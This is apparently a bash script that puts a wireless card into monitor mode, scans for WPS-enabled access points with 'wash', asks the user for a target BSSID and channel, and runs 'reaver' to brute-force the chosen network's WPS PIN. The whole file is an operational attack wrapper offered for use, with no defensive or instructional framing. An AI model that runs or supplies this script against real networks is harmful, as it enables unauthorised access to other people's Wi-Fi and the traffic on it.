#!/bin/bash

mode=$(iwconfig "${INTERFACE}" | grep "Mode:" | awk '{print $1}')
if [ "${mode}" = "Mode:Managed" ]; then
    sudo ifconfig "${INTERFACE}" down
    sudo iwconfig "${INTERFACE}" mode monitor
    sudo ifconfig "${INTERFACE}" up
fi

sleep 3

echo -e "Press ctrl+c when scanning finishes\n"
sudo wash -i "$INTERFACE"

read -p "bssid?: " bssid
read -p "channel?: " channel
read -p "use 5ghz? (y/n): " ghz
if [ "$ghz" = "n" ]; then
    sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -vv
elif [ "$ghz" = "y" ]; then
    sudo reaver -i "$INTERFACE" -b "$bssid" -c "$channel" -5 -vv
fi
